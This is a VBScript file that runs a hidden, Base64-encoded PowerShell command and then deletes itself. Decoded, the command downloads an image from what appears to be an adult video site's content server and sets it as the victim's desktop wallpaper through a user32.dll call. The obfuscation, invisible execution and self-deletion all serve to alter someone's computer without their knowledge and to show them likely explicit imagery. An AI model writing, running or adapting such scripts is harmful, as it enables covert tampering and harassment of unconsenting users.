Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -EncodedCommand CgAkAHUAcgBsAD0AIgBoAHQAdABwAHMAOgAvAC8AYwBkAG4ANwA3AC0AcABpAGMALgB4AHYAaQBkAGUAbwBzAC0AYwBkAG4ALgBjAG8AbQAvAHYAaQBkAGUAbwBzAC8AdABoAHUAbQBiAHMAMQA2ADkAcABvAHMAdABlAHIALwBmAGEALwBkAGEALwBjADEALwBmAGEAZABhAGMAMQBkADYAMgA1ADkAMwAyADMAYwAyADUAMAA0ADIANAA1AGYAYwAwAGYAMABkADIAOQAyADMALwBmAGEAZABhAGMAMQBkADYAMgA1ADkAMwAyADMAYwAyADUAMAA0ADIANAA1AGYAYwAwAGYAMABkADIAOQAyADMALgAzADAALgBqAHAAZwAiADsAJABwAGEAdABoAD0AIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwAUABpAGMAdAB1AHIAZQBzAFwAdwBhAGwAbABwAGEAcABlAHIALgBqAHAAZwAiADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAYQB0AGgAOwBBAGQAZAAtAFQAeQBwAGUAIAAtAFQAeQBwAGUARABlAGYAaQBuAGkAdABpAG8AbgAgACcAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVwBhAGwAbABwAGEAcABlAHIAewBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFMAeQBzAHQAZQBtAFAAYQByAGEAbQBlAHQAZQByAHMASQBuAGYAbwAoAGkAbgB0ACAAdQBBAGMAdABpAG8AbgAsAGkAbgB0ACAAdQBQAGEAcgBhAG0ALABzAHQAcgBpAG4AZwAgAGwAcAB2AFAAYQByAGEAbQAsAGkAbgB0ACAAZgB1AFcAaQBuAEkAbgBpACkAOwB9ACcAOwBbAFcAYQBsAGwAcABhAHAAZQByAF0AOgA6AFMAeQBzAHQAZQBtAFAAYQByAGEAbQBlAHQAZQByAHMASQBuAGYAbwAoADAAeAAwADAAMQA0ACwAMAAsACQAcABhAHQAaAAsADAAeAAwADAAMAAxACAALQBiAG8AcgAgADAAeAAwADAAMAAyACkACgA=", 0, False
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile WScript.ScriptFullName
